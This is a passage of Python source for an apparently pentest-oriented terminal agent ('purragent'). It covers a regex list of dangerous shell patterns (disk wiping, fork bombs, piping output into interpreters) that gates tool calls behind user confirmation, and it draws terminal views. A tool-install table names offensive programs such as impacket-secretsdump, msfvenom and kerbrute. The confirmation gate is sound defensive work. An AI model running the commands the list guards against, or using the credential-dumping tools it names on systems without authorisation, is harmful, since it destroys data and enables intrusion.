    (re.compile(r'(^|[\s;&|(])(dd|mkfs\S*|fdisk|parted|wipefs|blkdiscard|sgdisk)([\s;&|)]|$)'), "writes to disks/partitions"),
    (re.compile(r'(^|[\s;&|(])(mv|cp|ln|tee|truncate|touch|install|rsync)([\s;&|)]|$)'), "creates/moves/overwrites files"),
    (re.compile(r'(^|[\s;&|(])(chmod|chown|chgrp)([\s;&|)]|$)'), "changes permissions/ownership"),
    (re.compile(r'(^|[\s;&|(])(kill|pkill|killall)([\s;&|)]|$)'), "kills processes"),
    (re.compile(r'(^|[\s;&|(])(systemctl|service|initctl|rc-service)([\s;&|)]|$)'), "controls system services"),
    (re.compile(r'(^|[\s;&|(])(apt|apt-get|aptitude|dpkg|pip|pip3|pipx|npm|gem|snap|flatpak|pacman|yum|dnf|brew)([\s;&|)]|$)'), "changes installed packages"),
    (re.compile(r'(^|[\s;&|(])(mount|umount|swapon|swapoff)([\s;&|)]|$)'), "changes mounts"),
    (re.compile(r'(^|[\s;&|(])(reboot|shutdown|halt|poweroff|init|telinit)([\s;&|)]|$)'), "reboots or powers off the host"),
    (re.compile(r'(^|[\s;&|(])(useradd|userdel|usermod|groupadd|groupdel|passwd|chpasswd|adduser|deluser)([\s;&|)]|$)'), "modifies users/groups"),
    (re.compile(r'(^|[\s;&|(])(iptables|ip6tables|nft|ufw|firewall-cmd)([\s;&|)]|$)'), "changes firewall rules"),
    (re.compile(r'(^|[\s;&|(])(crontab|at)([\s;&|)]|$)'), "schedules jobs"),
    (re.compile(r':\s*\(\s*\)\s*\{.*[|&].*\}'), "looks like a fork bomb"),
    (re.compile(r'\|\s*(sudo\s+)?(sh|bash|zsh|dash|python\d?|perl|ruby)\b'), "pipes output into an interpreter"),
]


def _has_write_redirect(cmd: str) -> bool:
    """True if the command redirects output into a file (not /dev/null or an fd
    dup like 2>&1) — i.e. it writes somewhere."""
    for m in re.finditer(r'\d*>>?', cmd):
        rest = cmd[m.end():].lstrip()
        if rest[:1] == "&" or rest.startswith("/dev/null"):
            continue
        return True
    return False


def _classify_command(command: str):
    """(needs_confirm, reason) for a run_command shell string in semi-auto."""
    cmd = command.strip()
    if not cmd:
        return False, ""
    for pat, why in _DANGER_PATTERNS:
        if pat.search(cmd):
            return True, why
    if _has_write_redirect(cmd):
        return True, "redirects output into a file"
    bins = []
    for seg in re.split(r'[;&|]+', cmd):
        seg = seg.strip()
        if not seg:
            continue
        try:
            toks = shlex.split(seg)
        except ValueError:
            return True, "command could not be parsed safely"
        if toks:
            bins.append(os.path.basename(toks[0]))
    if bins and all(b in _READONLY_BINS for b in bins):
        return False, ""
    unknown = next((b for b in bins if b not in _READONLY_BINS), cmd[:30])
    return True, f"not a known read-only command ({unknown})"


def _needs_confirm(mode: str, name: str, args: dict):
    """(confirm?, reason) for a resolved tool call under the given run mode."""
    if mode == "auto":
        return False, ""
    if mode == "confirm":
        return True, ""
    if mode != "semi-auto":
        return False, ""
    tool = mcp_client.split_namespaced(name)[1]
    if tool in _READONLY_TOOLS:
        return False, ""
    if tool == "run_command":
        return _classify_command(str(args.get("command", "")))
    if tool == "http_request":
        method = str(args.get("method", "GET")).upper()
        if method in ("GET", "HEAD", "OPTIONS"):
            return False, ""
        return True, f"{method} request may change server state"
    if tool in ("write_file", "edit_file"):
        return True, "modifies a file on disk"
    return True, "external / unclassified tool"       # fail-closed


def _confirm_action(name: str, args: dict, reason: str) -> bool:
    """Prompt the user to approve a tool call. Returns True to run it."""
    tool = mcp_client.split_namespaced(name)[1]
    preview = _tool_arg_preview(args)
    line = Text("  ⚠ confirm  ", style="yellow")
    line.append(tool, style=f"bold {VIOLET}")
    if preview:
        line.append(f"  {preview}", style="bright_black")
    console.print(line)
    if reason:
        console.print(Text(f"      {reason}", style="bright_black"))
    try:
        ans = input("      run this? [y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        ans = ""
    if ans in ("y", "yes"):
        return True
    console.print(Text("      skipped", style="bright_black"))
    return False


# ── Banner + help ──────────────────────────────────────────────────────────────

def _logo_text(variant: str = "open") -> Text:
    """The logo silhouette (open / blink / squint eyes), painted violet."""
    path = LOGO_PATHS.get(variant, LOGO_PATHS["open"])
    try:
        with open(path, encoding="utf-8") as f:
            art = f.read().rstrip("\n")
    except Exception:
        art = FALLBACK_PAW
    return Text(art, style=VIOLET)


def _model_status(profile: dict | None) -> Text:
    """One-line 'attached model' status for the box and the toolbar."""
    if profile:
        t = Text("● ", style="green")
        t.append(_model_short(profile), style=f"bold {VIOLET}")
        t.append(f" · {profile.get('provider', '?')}", style="dim")
        return t
    t = Text("○ ", style="yellow")
    t.append("No model selected", style="bold yellow")
    t.append(" — type ", style="dim")
    t.append("/model", style="cyan")
    t.append(" to choose one", style="dim")
    return t


def _banner_panel(profile: dict | None, logo: Text, greeting: str,
                  returning: bool = True) -> Panel:
    left = Table.grid(padding=0)
    left.add_column()
    # First ever launch greets differently — "back" would imply a return.
    welcome = (f"Welcome back {greeting}!" if returning
               else f"Welcome, {greeting}!")
    left.add_row(Text(welcome, style="bold white"))
    left.add_row("")
    left.add_row(logo)
    left.add_row("")
    left.add_row(_model_status(profile))

    cmds = Table.grid(padding=(0, 2))
    cmds.add_column(style="cyan", no_wrap=True)
    cmds.add_column(style="grey50", no_wrap=True)
    cmds.add_row(Text("Commands", style="bold white"), "")
    for cmd, hint in BANNER_COMMANDS:
        cmds.add_row(cmd, hint)

    # A one-line pitch above the commands: playful identity + the architecture
    # that makes a small local model punch above its weight (RAG-driven
    # just-in-time tool discovery — tools are pulled only when asked for).
    right = Group(
        Text("Small cat, big claws", style=f"bold {VIOLET}"),
        Text("MCP-Zero hack agent", style="grey50"),
        Text("built for small models", style="grey50"),
        Text("─" * 20, style=VIOLET),
        cmds,
    )

    body = Table(show_header=False, box=box.MINIMAL, show_edge=False,
                 pad_edge=False, padding=(0, 2))
    body.add_column(vertical="middle", width=24)
    body.add_column(vertical="middle", width=22)
    body.add_row(left, right)

    return Panel(
        body,
        title=f"[bold {VIOLET}]{TOOL_NAME}[/] [dim]v{VERSION}[/]",
        title_align="left",
        border_style=VIOLET,
        padding=(1, 2),
        width=64,
    )


def _render_ansi(renderable) -> str:
    """Render a rich renderable to an ANSI string (for use as a prompt message)."""
    buf = io.StringIO()
    Console(file=buf, force_terminal=True, color_system="truecolor",
            width=80).print(renderable)
    return buf.getvalue()


def _drain_stdin() -> None:
    """Discard any bytes waiting on stdin. On the alternate screen many terminals
    send the mouse wheel as arrow-key escape sequences (xterm 'alternateScroll');
    if an overlay leaves some of those bytes unread they corrupt the next prompt,
    so we flush the input queue when returning to the REPL."""
    try:
        import termios
        if sys.stdin.isatty():
            termios.tcflush(sys.stdin.fileno(), termios.TCIFLUSH)
    except Exception:
        pass


def _read_key(fd) -> str:
    """Read one keypress from a raw (cbreak) fd and classify it. Uses os.read (NOT
    sys.stdin.read, which buffers and would hide the tail of an escape sequence).
    Returns 'up'/'down'/'left'/'right'/'pgup'/'pgdn'/'home'/'end'/'enter'/
    'refresh'/'enable'/'disable'/'quit' or None. Enter maps to 'enter' (an
    "open"/confirm, distinct from 'quit') so callers can drill in; q/Esc/Ctrl-C
    are 'quit'.
    On the alternate screen the mouse wheel arrives as arrow keys, so scrolling
    the wheel maps straight onto up/down."""
    import select
    ch = os.read(fd, 1)
    simple = {b"q": "quit", b"Q": "quit", b"\r": "enter", b"\n": "enter",
              b"\x03": "quit", b"": "quit",
              b"r": "refresh", b"R": "refresh",
              b"e": "enable", b"E": "enable", b"d": "disable", b"D": "disable",
              b"j": "down", b"k": "up", b" ": "pgdn", b"g": "home", b"G": "end"}
    if ch in simple:
        return simple[ch]
    if ch == b"\x1b":
        seq = b""
        while select.select([fd], [], [], 0.03)[0]:
            seq += os.read(fd, 32)
        if not seq:
            return "quit"                     # lone Esc
        return {b"[A": "up", b"OA": "up", b"[B": "down", b"OB": "down",
                b"[C": "right", b"OC": "right", b"[D": "left", b"OD": "left",
                b"[5~": "pgup", b"[6~": "pgdn",
                b"[H": "home", b"[1~": "home", b"OH": "home",
                b"[F": "end", b"[4~": "end", b"OF": "end"}.get(seq)
    return None


def show_view(body: str, hint: str = "↑/↓ scroll · q to return") -> None:
    """Show content on the alternate screen buffer as a scrollable pager: content
    taller than the terminal scrolls with the arrow keys / mouse wheel, PgUp/PgDn,
    Home/End (and j/k, space, g/G); Esc/q/Enter returns and restores the previous
    screen, leaving no clutter in scrollback."""
    import termios
    import tty

    if not sys.stdin.isatty():
        return
    lines = body.rstrip("\n").split("\n")
    size = shutil.get_terminal_size((80, 24))
    page = max(1, size.lines - 1)             # last row reserved for the status bar
    max_off = max(0, len(lines) - page)
    offset = 0

    def status_bar() -> str:
        if max_off > 0:
            last = min(offset + page, len(lines))
            text = (f" {offset + 1}-{last}/{len(lines)}   "
                    "↑/↓ scroll · space/PgDn page · g/G top/bottom · q return ")
        else:
            text = f" {hint} "
        return f"\x1b[7m{text}\x1b[0m\x1b[K"

    def render() -> None:
        visible = lines[offset:offset + page]
        visible = visible + [""] * (page - len(visible))    # pad to pin status bar
        out = ["\x1b[H"]                       # home; per-line \x1b[K avoids a flicker-y full clear
        for ln in visible:
            out.append(ln + "\x1b[0m\x1b[K\r\n")
        out.append(status_bar())
        sys.stdout.write("".join(out))
        sys.stdout.flush()

    with _alt_screen():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            render()
            while True:
                key = _read_key(fd)
                if key in ("quit", "enter"):
                    break                      # Enter also returns from the pager
                if max_off == 0 or key is None:
                    continue                   # nothing to scroll / unknown key
                prev = offset
                if key == "down":
                    offset += 1
                elif key == "up":
                    offset -= 1
                elif key == "pgdn":
                    offset += page
                elif key == "pgup":
                    offset -= page
                elif key == "home":
                    offset = 0
                elif key == "end":
                    offset = max_off
                offset = max(0, min(offset, max_off))
                if offset != prev:
                    render()
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            termios.tcflush(fd, termios.TCIFLUSH)   # drop any leftover input


def _stream_view(title: str, run_stream, header: str = "") -> None:
    """Alt-screen LIVE-streaming view (like a slash overlay, e.g. /model). `run_stream`
    is a callable taking an `emit(piece)` sink; it streams text via emit and blocks
    until done. The text renders live, auto-scrolling to the bottom; Ctrl-C cancels
    the stream. When the stream ends it becomes a scrollable pager — Esc/q returns to
    the main screen, ↑/↓ · PgUp/PgDn · g/G scroll. `header` is echoed at the top in a
    distinct colour (e.g. the user's btw question) for a chat-like feel."""
    import termios
    import tty
    import textwrap

    if not sys.stdin.isatty():                    # no TTY → just run and print inline
        if header:
            sys.stdout.write(f"❯ {header}\n\n")
        run_stream(lambda p: (sys.stdout.write(p), sys.stdout.flush()))
        return

    buf: list = []
    size = shutil.get_terminal_size((80, 24))
    width = max(20, size.columns - 2)
    # Header (the question) is wrapped on plain text, then coloured per line — so the
    # colour codes never confuse the width/wrapping. It sits fixed above the answer.
    hdr = textwrap.wrap(header, width) if header else []
    hdr_rows = (len(hdr) + 1) if hdr else 0        # + a blank separator line
    page = max(1, size.lines - 1 - hdr_rows)       # last row = status bar
    offset = [0]
    follow = [True]                               # stick to the bottom while streaming

    def lines() -> list:
        out: list = []
        for para in "".join(buf).split("\n"):
            out.extend(textwrap.wrap(para, width) or [""])
        return out

    def render(streaming: bool) -> None:
        ls = lines()
        max_off = max(0, len(ls) - page)
        offset[0] = max_off if follow[0] else min(offset[0], max_off)
        visible = ls[offset[0]:offset[0] + page]
        visible += [""] * (page - len(visible))
        out = ["\x1b[H"]
        for i, hl in enumerate(hdr):              # the echoed question, bold cyan
            out.append(f"\x1b[1;36m{'❯ ' if i == 0 else '  '}{hl}\x1b[0m\x1b[K\r\n")
        if hdr:
            out.append("\x1b[K\r\n")              # blank line between question + answer
        for ln in visible:
            out.append(ln + "\x1b[0m\x1b[K\r\n")
        bar = ("streaming… · Ctrl-C to stop" if streaming
               else "q/Esc return · ↑/↓ scroll")
        out.append(f"\x1b[7m {title} · {bar} \x1b[0m\x1b[K")
        sys.stdout.write("".join(out))
        sys.stdout.flush()

    with _alt_screen():
        def emit(piece: str) -> None:
            buf.append(piece)
            render(streaming=True)

        render(streaming=True)
        try:
            run_stream(emit)
        except (KeyboardInterrupt, SystemExit):
            buf.append("\n\n[interrupted]")
        except Exception as e:                    # noqa: BLE001 — show any stream error
            buf.append(f"\n\n[error: {e}]")
        follow[0] = False
        render(streaming=False)

        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            while True:
                key = _read_key(fd)
                if key in ("quit", "enter"):
                    break
                ls = lines()
                max_off = max(0, len(ls) - page)
                if key == "down":
                    offset[0] = min(max_off, offset[0] + 1)
                elif key == "up":
                    offset[0] = max(0, offset[0] - 1)
                elif key == "pgdn":
                    offset[0] = min(max_off, offset[0] + page)
                elif key == "pgup":
                    offset[0] = max(0, offset[0] - page)
                elif key == "home":
                    offset[0] = 0
                elif key == "end":
                    offset[0] = max_off
                else:
                    continue
                render(streaming=False)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            termios.tcflush(fd, termios.TCIFLUSH)


MCP_PROBE_TIMEOUT = 20.0   # hard cap (s) on a background HTTP liveness probe
ENABLE_TIMEOUT = 60.0      # hard cap (s) on a background enable (tool fetch);
                           # generous because it's non-blocking + cancellable, and
                           # some servers (e.g. GitMCP) take ~20s+ to list tools


def _mcp_row(r: dict, selected: bool, namew: int) -> Text:
    """One compact server line for the /mcp list (status + version + enabled +
    tool count, no tool listing). The selected row gets a violet '❯' cursor."""
    t = Text()
    t.append("❯ " if selected else "  ", style=f"bold {VIOLET}")
    name_style = f"bold {VIOLET}" if selected else "bold white"
    name = r["name"].ljust(namew + 2)
    if r.get("connecting") is not None:
        t.append("◍ ", style="cyan")
        t.append(name, style=name_style)
        t.append(f"connecting… {r['connecting']}s", style="cyan")
    elif not r["probed"]:
        t.append("○ ", style="bright_black")
        t.append(name, style=name_style)
        t.append("disabled", style="yellow")
        return t                       # a never-spawned stdio server — nothing else
    elif r["alive"]:
        t.append("● ", style="green")
        t.append(name, style=name_style)
        t.append("alive", style="bold green")
        if r["detail"]:
            t.append(f" · {r['detail'][:32]}", style="dim")
    else:
        t.append("○ ", style="red")
        t.append(name, style=name_style)
        t.append("dead", style="bold red")
        if r["detail"]:
            t.append(f" — {r['detail'][:32]}", style="red")
    tag, tag_style = ("enabled", "dim") if r["enabled"] else ("disabled", "yellow")
    t.append(f"   ·   {tag}", style=tag_style)
    n = len(r["tools"])
    if n:
        t.append(f"  ·  {n} tool{'s' if n != 1 else ''}", style="dim")
    return t


def _mcp_list_lines(rows: list, sel: int, tools_ok: bool) -> list:
    """The top-level /mcp screen: one line per server, no tools. Returns rendered
    ANSI lines; server i is always at line index 2 (title + blank) + i."""
    parts = [Text("purragent — MCP servers", style=f"bold {VIOLET}"), Text("")]
    if not rows:
        parts.append(Text("No MCP servers configured.", style="dim"))
    else:
        namew = max(len(r["name"]) for r in rows)
        for i, r in enumerate(rows):
            parts.append(_mcp_row(r, i == sel, namew))
    if not tools_ok:
        parts.append(Text(""))
        parts.append(Text(
            "The attached model has no function calling — tools won't be used "
            "until you pick one that does (/model).", style="yellow"))
    return _render_ansi(Group(*parts)).rstrip("\n").split("\n")


def _mcp_detail_lines(r: dict) -> list:
    """The drill-in screen for one server: full status header, URL, and its tool
    list (or an explanation of why there's nothing to show)."""
    name = r["name"]
    parts = [Text(f"purragent — {name}", style=f"bold {VIOLET}"), Text("")]
    head = Text()
    if r.get("connecting") is not None:
        head.append("◍ ", style="cyan")
        head.append(f"connecting… {r['connecting']}s", style="cyan")
    elif not r["probed"]:
        head.append("○ ", style="bright_black")
        head.append("disabled", style="yellow")
    elif r["alive"]:
        head.append("● ", style="green")
        head.append("alive", style="bold green")
        if r["detail"]:
            head.append(f" · {r['detail']}", style="dim")
    else:
        head.append("○ ", style="red")
        head.append("dead", style="bold red")
        if r["detail"]:
            head.append(f" — {r['detail']}", style="red")
    tag, tag_style = ("enabled", "dim") if r["enabled"] else ("disabled", "yellow")
    head.append(f"   ·   {tag}", style=tag_style)
    parts.append(head)
    if r["is_http"] and r["url"]:
        parts.append(Text(f"{r['url']}", style="dim"))
    parts.append(Text(""))

    tools = r["tools"]
    if tools:
        parts.append(Text(f"{len(tools)} tool{'s' if len(tools) != 1 else ''}",
                          style="bold white"))
        parts.append(Text(""))
        grid = Table.grid(padding=(0, 2))
        grid.add_column(style=f"bold {VIOLET}", no_wrap=True)
        grid.add_column(style="dim")
        for t in tools:
            grid.add_row("  " + t.get("name", "?"),
                         Text(t.get("description", ""), style="dim"))
        parts.append(grid)
    else:
        if r.get("connecting") is not None:
            msg = "still connecting — tools will appear once it responds."
        elif not r["probed"]:
            msg = f"disabled — /mcp enable {name} to pull its tools."
        elif not r["alive"]:
            msg = "unreachable — no tools to show."
        elif not r["enabled"]:
            msg = f"not enabled — /mcp enable {name} to pull and cache its tools."
        else:
            msg = "this server exposes no tools."
        parts.append(Text(msg, style="dim"))
    return _render_ansi(Group(*parts)).rstrip("\n").split("\n")


def _toggle_notice(status: str, info: str) -> str:
    """A short result line for an enable/disable action inside the /mcp view."""
    return {
        "enabled":  "  ✓ enabled" + (f" · {info}" if info else ""),
        "disabled": "  ✓ disabled",
        "builtin":  "  built-in — can't change",
        "error":    f"  ✗ {info[:44]}",
        "missing":  "  ✗ no such server",
    }.get(status, "")


# Install hint per program the hacktools tools need — how to get it (apt / pip / go /
# github). Unlisted programs default to "apt: <name>". Used by /doctor.
_PKG_HINT = {
    "nxc": "apt: netexec",
    "impacket-secretsdump": "apt: impacket-scripts",
    "impacket-wmiexec": "apt: impacket-scripts",
    "impacket-GetUserSPNs": "apt: impacket-scripts",
    "dig": "apt: dnsutils", "ldapsearch": "apt: ldap-utils",
    "rpcclient": "apt: samba-common-bin", "showmount": "apt: nfs-common",
    "redis-cli": "apt: redis-tools", "mongosh": "apt: mongodb-mongosh",
    "mysql": "apt: default-mysql-client", "psql": "apt: postgresql-client",
    "searchsploit": "apt: exploitdb", "msfvenom": "apt: metasploit-framework",
    "theHarvester": "apt: theharvester", "bloodhound-python": "pip: bloodhound",
    "certipy": "pip: certipy-ad", "kerbrute": "github: ropnop/kerbrute",
    "gau": "go: lc/gau", "katana": "go: projectdiscovery/katana",
    "dalfox": "go: hahwul/dalfox", "subfinder": "go: projectdiscovery/subfinder",
    "sshpass": "apt: sshpass",
}


def _doctor_render(mcp: "mcp_client.MCPManager", out: "Console") -> None:
    """Render the hacktools doctor report to `out`: which tools can't run because their
    program (PATH) or python library is missing, grouped with an install hint. hacktools
    is a local stdio server, so it shares this host's PATH; the check is shutil.which."""
    try:
        tools = [t for t in mcp.all_tools()
                 if mcp_client.split_namespaced(t["name"])[0] == "hacktools"]
    except Exception:                                  # noqa: BLE001
        tools = []
    if not tools:
        out.print("  [yellow]hacktools MCP server not available[/yellow] "
                  "[dim]— run /mcp to check it's enabled[/dim]")
        return
    ready = 0
    missing: dict = {}                                 # binary -> [tool names]
    missing_py: dict = {}                              # pip hint -> [tool names]
    which_cache: dict = {}
    for t in tools:
        tool = mcp_client.split_namespaced(t["name"])[1]
        binary = t.get("requires")
        if not binary:                                 # python-native tool
            py_missing = t.get("py_missing") or []
            if py_missing:                             # …but a python lib is absent
                for hint in py_missing:
                    missing_py.setdefault(hint, []).append(tool)
            else:
                ready += 1
            continue
        ok = which_cache.get(binary)
        if ok is None:
            ok = bool(shutil.which(binary))
            which_cache[binary] = ok
        if ok:
            ready += 1
        else:
            missing.setdefault(binary, []).append(tool)
    out.print(Text("purragent — hacktools doctor", style=f"bold {VIOLET}"))
    out.print(Text(""))
    out.print(Text(f"  ✓ {ready} tool(s) ready", style="green"))
    if not missing and not missing_py:
        out.print(Text("    every hacktool has its program and libraries installed.",
                       style="bright_black"))
        return
    if missing:
        n_tools = sum(len(v) for v in missing.values())
        out.print(Text(f"  ✗ {n_tools} tool(s) need a program — install "
                       f"{len(missing)}:", style="red"))
        width = max(len(b) for b in missing)
        for binary in sorted(missing):
            line = Text("    ")
            line.append(binary.ljust(width), style="bold red")
            line.append("  " + _PKG_HINT.get(binary, f"apt: {binary}"), style="cyan")
            line.append("  → " + ", ".join(sorted(missing[binary])), style="bright_black")
            out.print(line)
    if missing_py:
        n_tools = len({tl for v in missing_py.values() for tl in v})
        out.print(Text(f"  ✗ {n_tools} tool(s) need a python library:", style="red"))
        width = max(len(h) for h in missing_py)
        for hint in sorted(missing_py):
            line = Text("    ")
            line.append(hint.ljust(width), style="cyan")
            line.append("  → " + ", ".join(sorted(set(missing_py[hint]))),
                        style="bright_black")
            out.print(line)


def _doctor_view(mcp: "mcp_client.MCPManager") -> None:
    """/doctor — the hacktools install report. On a TTY it opens in its own alt-screen
    window (like /mcp and /status), so background hack-mode prints can't corrupt it;
    otherwise it prints once inline."""
    if not sys.stdin.isatty():
        _doctor_render(mcp, console)
        return
    buf = io.StringIO()
    cols = shutil.get_terminal_size((80, 24)).columns
    cap = Console(file=buf, force_terminal=True, color_system="truecolor",
                  width=cols, highlight=False)
    _doctor_render(mcp, cap)
    show_view(buf.getvalue(), hint="q to return")


def _mcp_view(mcp: "mcp_client.MCPManager", tools_ok: bool) -> None:
    """Live /mcp overlay, two levels like the model picker. The top level lists
    servers only (status, version, enabled, tool count) — navigate with ↑/↓ and
    press Enter/→ to open a server and see its tools; ←/q go back. Inside a
    server, 'e'/'d' enable/disable it (built-ins can't be toggled). Opens
    instantly: stdio liveness is a local poll, while each HTTP endpoint is probed
    in a background thread (parallel, capped at MCP_PROBE_TIMEOUT) and shows a
    live '◍ connecting… Ns' countdown that flips to alive/dead. 'r' re-probes."""
    import select
    import termios
    import threading
    import tty

    base_rows = mcp.overview(probe=False)
    http = [r for r in base_rows if r.get("pending")]

    if not sys.stdin.isatty():         # no tty → can't drive an interactive view
        show_view(_mcp_body(mcp.overview(probe=True), tools_ok))
        return

    results: dict = {}                 # name -> (alive, detail); absent = in flight
    started: dict = {}                 # name -> monotonic start (for the countdown)
    lock = threading.Lock()

    def launch() -> None:
        with lock:
            results.clear()
        now = time.monotonic()
        for r in http:
            started[r["name"]] = now
        for r in http:
            def worker(name=r["name"], spec=r["spec"]) -> None:
                ok, info = mcp.probe_server(name, spec, timeout=MCP_PROBE_TIMEOUT)
                with lock:
                    results[name] = (bool(ok), info)
            threading.Thread(target=worker, daemon=True).start()

    def resolve() -> list:
        """Merge live probe results / countdowns into the base rows."""
        now = time.monotonic()
        out = []
        for r in base_rows:
            if r.get("pending"):
                r = dict(r)
                with lock:
                    res = results.get(r["name"])
                if res is not None:
                    r["alive"], r["detail"], r["probed"] = res[0], res[1], True
                    r["connecting"] = None
                else:
                    r["probed"] = True
                    rem = MCP_PROBE_TIMEOUT - (now - started.get(r["name"], now))
                    r["connecting"] = max(0, round(rem))
            out.append(r)
        return out

    launch()
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    mode = "list"                      # "list" (servers) or "detail" (one server's tools)
    sel = 0                            # highlighted server index
    list_off = 0                       # list viewport scroll
    det_off = 0                        # detail viewport scroll
    notice = ""                        # transient enable/disable result line
    job = None                         # in-flight background enable (cancellable)
    with _alt_screen():
        try:
            tty.setcbreak(fd)
            while True:
                # Advance an in-flight enable BEFORE resolving the rows, so that
                # when the fetch finishes we commit + rebuild base_rows and the
                # very next render (same iteration) already shows the new tools —
                # no keypress needed. The fetch runs in a daemon thread and has no
                # side effects, so we commit (cache + flip) here in the main thread
                # only if it finished and wasn't cancelled; a timeout just abandons
                # the worker (it dies on its own socket timeout).
                if job is not None:
                    res = job["result"]
                    if res is not None:
                        st, info, tools = res
                        if st == "ready":
                            mcp.enable_commit(job["name"], tools)
                            notice = ("  ✓ refreshed" + (f" · {info}" if info else "")
                                      if job.get("verb") == "refreshing"
                                      else _toggle_notice("enabled", info))
                        else:
                            notice = _toggle_notice(st, info)
                        base_rows = mcp.overview(probe=False)
                        http = [r for r in base_rows if r.get("pending")]
                        job = None
                    elif time.monotonic() - job["started"] >= ENABLE_TIMEOUT:
                        notice = "  ✗ timed out — enable cancelled"
                        job = None

                rows = resolve()
                waiting = (job is not None
                           or any(r.get("connecting") is not None for r in rows))
                size = shutil.get_terminal_size((80, 24))
                page = max(1, size.lines - 1)

                if mode == "list":
                    if rows:
                        sel %= len(rows)
                    lines = _mcp_list_lines(rows, sel, tools_ok)
                    max_off = max(0, len(lines) - page)
                    sel_line = 2 + (sel if rows else 0)   # keep the cursor on-screen
                    if sel_line < list_off:
                        list_off = sel_line
                    elif sel_line >= list_off + page:
                        list_off = sel_line - page + 1
                    offset = max(0, min(list_off, max_off))
                    footer = " ↑/↓ move · → open · r refresh · q return "
                else:
                    row = rows[sel]
                    lines = _mcp_detail_lines(row)
                    max_off = max(0, len(lines) - page)
                    # Clamp det_off itself (not just a derived offset) so presses
                    # past the top/bottom don't pile up — otherwise you'd have to
                    # press back the same number of times before the view moves.
                    det_off = max(0, min(det_off, max_off))
                    offset = det_off
                    # Contextual enable/disable hint (built-ins can't be toggled).
                    if mcp_client.is_builtin_server(row["spec"]):
                        tog = ""
                    elif row["enabled"]:
                        tog = "d disable · "
                    else:
                        tog = "e enable · "
                    if job is not None:
                        rem = max(0, round(ENABLE_TIMEOUT
                                           - (time.monotonic() - job["started"])))
                        footer = (f" {job['verb']} {job['name']}… {rem}s"
                                  "   ·   d/Esc cancel ")
                    else:
                        scroll = (f"{offset + 1}-{min(offset + page, len(lines))}"
                                  f"/{len(lines)}   ↑/↓ scroll · "
                                  if max_off > 0 else "")
                        footer = f" {scroll}{tog}esc back · r refresh{notice} "

                visible = lines[offset:offset + page]
                visible = visible + [""] * (page - len(visible))
                out = ["\x1b[H"]
                for ln in visible:
                    out.append(ln + "\x1b[0m\x1b[K\r\n")
                out.append(f"\x1b[7m{footer}\x1b[0m\x1b[K")
                sys.stdout.write("".join(out))
                sys.stdout.flush()

                # While probes run, tick every 0.25s to update the countdown; once
                # resolved, block on the next keypress (no busy loop / cache churn).
                tick = 0.25 if waiting else None
                if not select.select([fd], [], [], tick)[0]:
                    continue
                key = _read_key(fd)
                if key is not None:
                    notice = ""                    # a keypress dismisses the last result
                if key == "refresh":
                    launch()                       # re-probe liveness (both views)
                    # In a server's detail view, also re-pull its tools from the
                    # server (an enabled HTTP server), reusing the background job.
                    if mode == "detail" and job is None:
                        row = rows[sel]
                        if (row["is_http"] and row["enabled"]
                                and not mcp_client.is_builtin_server(row["spec"])):
                            newjob = {"name": row["name"], "started": time.monotonic(),
                                      "result": None, "verb": "refreshing"}
                            job = newjob

                            def _refresh_worker(j=newjob, nm=row["name"]) -> None:
                                j["result"] = mcp.enable_fetch(
                                    nm, timeout=ENABLE_TIMEOUT)
                            threading.Thread(target=_refresh_worker,
                                             daemon=True).start()
                    continue
                if mode == "list":
                    if key == "quit":
                        break
                    if not rows:
                        continue
                    if key == "up":
                        sel = (sel - 1) % len(rows)
                    elif key == "down":
                        sel = (sel + 1) % len(rows)
                    elif key == "home":
                        sel = 0
                    elif key == "end":
                        sel = len(rows) - 1
                    elif key in ("enter", "right"):
                        mode, det_off = "detail", 0
                elif job is not None:              # an enable is in flight
                    # d / Esc (or q) cancel it (safe: the fetch has no side
                    # effects and we never committed); scrolling still works.
                    if key in ("quit", "disable"):
                        job = None
                        notice = "  cancelled"
                    elif key == "down":
                        det_off += 1
                    elif key == "up":
                        det_off -= 1
                    elif key == "pgdn":
                        det_off += page
                    elif key == "pgup":
                        det_off -= page
                    elif key == "home":
                        det_off = 0
                    elif key == "end":
                        det_off = max_off
                else:                              # detail — scroll / toggle / back
                    if key == "quit":              # esc / q — the ← arrow no longer backs
                        mode = "list"
                    elif key in ("enable", "disable"):
                        row = rows[sel]
                        name = row["name"]
                        want = (key == "enable")
                        if mcp_client.is_builtin_server(row["spec"]):
                            notice = "  built-in — can't change"
                        elif row["enabled"] == want:
                            notice = f"  already {'enabled' if want else 'disabled'}"
                        elif not want:             # disable is instant (no network)
                            notice = _toggle_notice(mcp.disable_server(name), "")
                            base_rows = mcp.overview(probe=False)
                            http = [r for r in base_rows if r.get("pending")]
                        elif not row["is_http"]:   # enable a non-HTTP server: instant
                            st, info = mcp.enable_server(name)
                            notice = _toggle_notice(st, info)
                            base_rows = mcp.overview(probe=False)
                            http = [r for r in base_rows if r.get("pending")]
                        else:                      # enable HTTP: fetch tools in the
                            # background so the view stays live and cancellable.
                            newjob = {"name": name, "started": time.monotonic(),
                                      "result": None, "verb": "enabling"}
                            job = newjob

                            def _enable_worker(j=newjob, nm=name) -> None:
                                j["result"] = mcp.enable_fetch(
                                    nm, timeout=ENABLE_TIMEOUT)
                            threading.Thread(target=_enable_worker,
                                             daemon=True).start()
                    elif key == "down":
                        det_off += 1
                    elif key == "up":
                        det_off -= 1
                    elif key == "pgdn":
                        det_off += page
                    elif key == "pgup":
                        det_off -= page
                    elif key == "home":
                        det_off = 0
                    elif key == "end":
                        det_off = max_off
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
            termios.tcflush(fd, termios.TCIFLUSH)


def _erase_prompt_line() -> None:
    """Wipe the just-submitted prompt line ('❯ /help') from the main screen, so
    slash commands don't pile up in scrollback (Claude-Code style). prompt_toolkit
    leaves the accepted input echoed on its own line; we move up over it and clear."""
    if sys.stdout.isatty():
        sys.stdout.write("\x1b[1A\x1b[2K\r")
        sys.stdout.flush()


def _pause_after_command() -> None:
    """On the welcome screen every REPL turn wipes the screen to repaint the
    blinking banner, which would erase a command's printed output before it can
    be read. Wait for Enter so the user actually sees it first."""
    if not sys.stdin.isatty():
        return
    try:
        input("  \x1b[38;5;244mpress enter to continue…\x1b[0m ")
